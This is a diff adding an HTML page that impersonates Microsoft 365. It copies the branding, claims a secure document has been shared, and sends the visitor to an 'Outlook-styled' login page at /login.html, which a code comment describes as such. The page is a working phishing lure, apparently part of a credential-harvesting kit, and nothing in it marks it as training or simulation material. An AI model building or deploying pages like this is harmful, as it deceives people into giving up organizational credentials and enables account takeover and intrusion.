@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure Document Shared</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #f3f2f1;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .card {
+            background: white;
+            padding: 40px;
+            border-radius: 4px;
+            box-shadow: 0 1.6px 3.6px 0 rgba(0,0,0,0.132), 0 0.3px 0.9px 0 rgba(0,0,0,0.108);
+            text-align: center;
+            max-width: 420px;
+            width: 100%;
+        }
+        .logo-grid {
+            display: inline-grid;
+            grid-template-columns: repeat(2, 12px);
+            gap: 3px;
+            margin-bottom: 15px;
+        }
+        .logo-grid div {
+            width: 12px;
+            height: 12px;
+        }
+        .red { background-color: #f25022; }
+        .green { background-color: #7fba00; }
+        .blue { background-color: #00a4ef; }
+        .yellow { background-color: #ffb900; }
+        h2 {
+            font-size: 20px;
+            font-weight: 600;
+            color: #323130;
+            margin-bottom: 10px;
+        }
+        p {
+            color: #605e5c;
+            font-size: 14px;
+            margin-bottom: 24px;
+        }
+        .btn {
+            display: inline-block;
+            width: 100%;
+            padding: 10px 0;
+            background-color: #0078d4;
+            color: white;
+            text-decoration: none;
+            border-radius: 2px;
+            font-size: 15px;
+            font-weight: 600;
+            box-sizing: border-box;
+        }
+        .btn:hover {
+            background-color: #106ebe;
+        }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <div class="logo-grid">
+            <div class="red"></div>
+            <div class="green"></div>
+            <div class="blue"></div>
+            <div class="yellow"></div>
+        </div>
+        <h2>Secure Document Shared With You</h2>
+        <p>You have received a secure shared document via Microsoft 365. Please sign in with your organizational account to view the contents.</p>
+        
+        <!-- Relative path points to the Outlook-styled login page -->
+        <a href="/login.html" class="btn">Sign in to Outlook</a>
+    </div>
+</body>
+</html>
